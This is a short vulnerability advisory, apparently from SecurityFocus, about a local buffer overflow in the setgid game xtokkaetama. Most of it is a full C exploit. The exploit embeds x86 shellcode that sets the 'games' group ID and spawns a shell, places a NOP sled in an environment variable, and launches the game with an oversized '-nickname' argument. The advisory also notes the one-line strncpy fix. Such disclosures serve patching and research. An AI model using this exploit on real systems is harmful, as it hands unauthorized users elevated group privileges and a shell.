source: http://www.securityfocus.com/bid/8337/info

xtokkaetama is prone to a locally exploitable buffer overflow vulnerability. This is due to insufficient bounds checking of the '-nickname' command line option, which could result in execution of arbitrary code in the context of the software. 

The software is typically installed setgid 'games'.

/* (linux/x86)xtokkaetama[v1.0b+]: (games) local buffer overflow exploit.
   by: v9[v9@fakehalo.deadpig.org]. (fakehalo)

   exploits an overflow missed in the patch/upgrade of:
    http://www.securityfocus.com/bid/8312

   fix:
    xtama_score.c:132: +strncpy(name,nickname,sizeof(name)-1);
    xtama_score.c:132: -sscanf( nickname , "%s",name ) ;

   (tested on non-debian, should still work elsewhere)
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <grp.h>
#include <sys/types.h>
#define PATH "/usr/games/xtokkaetama" /* game binary. */
static char exec[]= /* setgid(?)+shell.               */
 "\x31\xdb\x31\xc9\xb3\x00\xb1\x00\x31\xc0\xb0\x47\xcd"
 "\x80\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56"
 "\x07\x89\x56\x0f\xb8\x1b\x56\x34\x12\x35\x10\x56\x34"
 "\x12\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80"
 "\xe8\xd7\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x01";
int main(){
 unsigned int i;
 char *buf;
 struct group *gent;
 printf("(*)xtokkaetama[v1.0b+]: local buffer overflow exploit.\n");
 printf("(*)by: v9@fakehalo.deadpig.org / fakehalo.\n\n");
 if(!(buf=(char *)malloc(16384+1)))exit(1);
 memset(buf,0x90,(16384-strlen(exec)));
 if(!(gent=getgrnam("games")))exec[5]=exec[7]=20;
 else{exec[5]=exec[7]=gent->gr_gid;}
 strcat(buf,exec);
 setenv("EXEC",buf,1);
 memset(buf,0x0,(16384+1));
 for(i=0;i<512;i+=4){*(long *)&buf[i]=0xbfffe001;} 
 printf("[*] in the game, hit: spacebar, \"Q\", spacebar, spacebar.\n");
 sleep(3);
 printf("[*] entering xtokkaetama...\n");
 if(execlp(PATH,PATH,"-nickname",buf,0))
  printf("[!] failed to execute %s.\n",PATH);
 exit(0);
}